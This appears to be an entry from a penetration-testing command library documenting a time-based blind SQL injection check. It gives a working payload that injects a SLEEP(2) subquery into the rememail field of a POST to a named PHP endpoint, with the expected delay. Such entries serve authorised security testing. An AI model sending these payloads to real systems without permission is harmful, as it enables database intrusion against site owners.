---
id: cmd-uuid-2
data: rememail=test@att.net'+(select*from(select(sleep(2)))a)+'
tags:
  - sqli
  - time-based
type: command
output: 2-second response delay
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:14.959Z'
verified: false
validated: true
submitted: true
---
# Sleep Injection Test

## Command

```bash
# Burp Suite: POST /elist/viewem6.php
# Body: rememail=test@att.net'+(select*from(select(sleep(2)))a)+'
```

## Description

Injects a SLEEP(2) subquery to induce delay, confirming time-based blind SQLi.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| rememail | Payload with SLEEP | Yes |

## Examples

### Basic Usage

```bash
# As above
```

## Expected Output

Response delayed by ~2 seconds due to database sleep.

## Related

- [[procedures/Test-Time-Based-SQL-Injection]]
